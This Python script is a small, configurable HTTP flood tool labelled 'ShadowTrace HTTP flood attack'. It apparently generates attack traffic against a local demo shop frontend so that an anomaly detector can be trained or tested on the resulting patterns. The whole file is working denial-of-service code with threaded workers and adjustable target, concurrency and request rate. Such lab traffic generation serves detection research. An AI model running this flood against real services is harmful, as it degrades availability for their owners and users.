"""HTTP flood: hammer the frontend with fast, repetitive requests.

Same public endpoint (frontend:8080) as normal traffic, just faster and more
regular. In the flooded window: call_repetition spikes, temporal_jitter -> 0,
path_entropy narrows.
"""

import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor

import requests

# cheap high-volume GETs that still fan out internally (a product page hits productcatalog)
FLOOD_PATHS = ["/", "/product/OLJCESPC7Z", "/product/66VCHSJNUP", "/cart"]

STOP = threading.Event()


def worker(base_url, label, counters, pause, idx):
    session = requests.Session()   # reuse the connection so each GET is as cheap as possible
    i = 0
    while not STOP.is_set():
        path = FLOOD_PATHS[i % len(FLOOD_PATHS)]   # rotate the handful of flood paths
        i += 1
        try:
            r = session.get(base_url + path, timeout=5)
            counters["ok" if r.status_code < 500 else "err"] += 1   # 5xx = we overwhelmed it
        except requests.RequestException:
            counters["err"] += 1
        time.sleep(pause)   # throttle so the cluster stays up, still ~4-5x normal


def main():
    p = argparse.ArgumentParser(description="ShadowTrace HTTP flood attack")
    p.add_argument("--duration", type=int, required=True, help="seconds to flood")
    p.add_argument("--url", default="http://localhost:8080", help="frontend base URL")
    p.add_argument("--concurrency", type=int, default=3, help="parallel flood workers")
    p.add_argument("--pause", type=float, default=0.15,
                   help="seconds between requests per worker (throttle so the cluster stays up)")
    p.add_argument("--label", default="http_flood", help="attack label (for logging only)")
    args = p.parse_args()

    counters = {"ok": 0, "err": 0}
    start = time.time()
    print(f"[flood] {args.concurrency} workers -> {args.url} for {args.duration}s")

    with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        # spin up the flood workers in parallel for the requested duration
        for idx in range(args.concurrency):
            pool.submit(worker, args.url, args.label, counters, args.pause, idx)
        try:
            time.sleep(args.duration)
        finally:
            STOP.set()   # burst over -> stop the workers

    elapsed = time.time() - start
    total = counters["ok"] + counters["err"]
    print(f"[flood] done: {total} requests in {elapsed:.0f}s "
          f"(~{total/elapsed:.0f} req/s, {counters['err']} errors)")


if __name__ == "__main__":
    main()
